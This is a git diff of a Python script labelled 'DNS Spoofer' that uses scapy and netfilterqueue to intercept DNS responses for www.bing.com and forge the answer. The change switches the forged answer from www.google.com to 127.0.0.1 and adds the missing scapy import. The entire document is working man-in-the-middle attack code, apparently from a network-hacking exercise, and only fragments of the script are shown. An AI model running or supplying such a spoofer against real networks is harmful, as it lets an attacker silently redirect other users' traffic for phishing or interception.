@@ -1,3 +1,5 @@
+#!/usr/bin/env python
+
 """
 DNS Spoofer
 
@@ -17,17 +19,19 @@ ping -c 1 www.google.com
 """
 
 
+import scapy.all as scapy
 import netfilterqueue
 
 
 def process_packet(packet):
+    target_url = "www.bing.com"
     scapy_packet = scapy.IP(packet.get_payload())
     if scapy_packet.haslayer(scapy.DNSRR):
         qname = scapy_packet[scapy.DNSQR].qname
-        if "www.bing.com" in qname:
+        if target_url in qname:
             print("[+] Spoofing target")
             # rdata = redirected IP
-            answer = scapy.DNSRR(rrname=qname, rdata="www.google.com")
+            answer = scapy.DNSRR(rrname=qname, rdata="127.0.0.1")
             scapy_packet[scapy.DNS].an = answer
             scapy_packet[scapy.DNS].ancount = 1
 
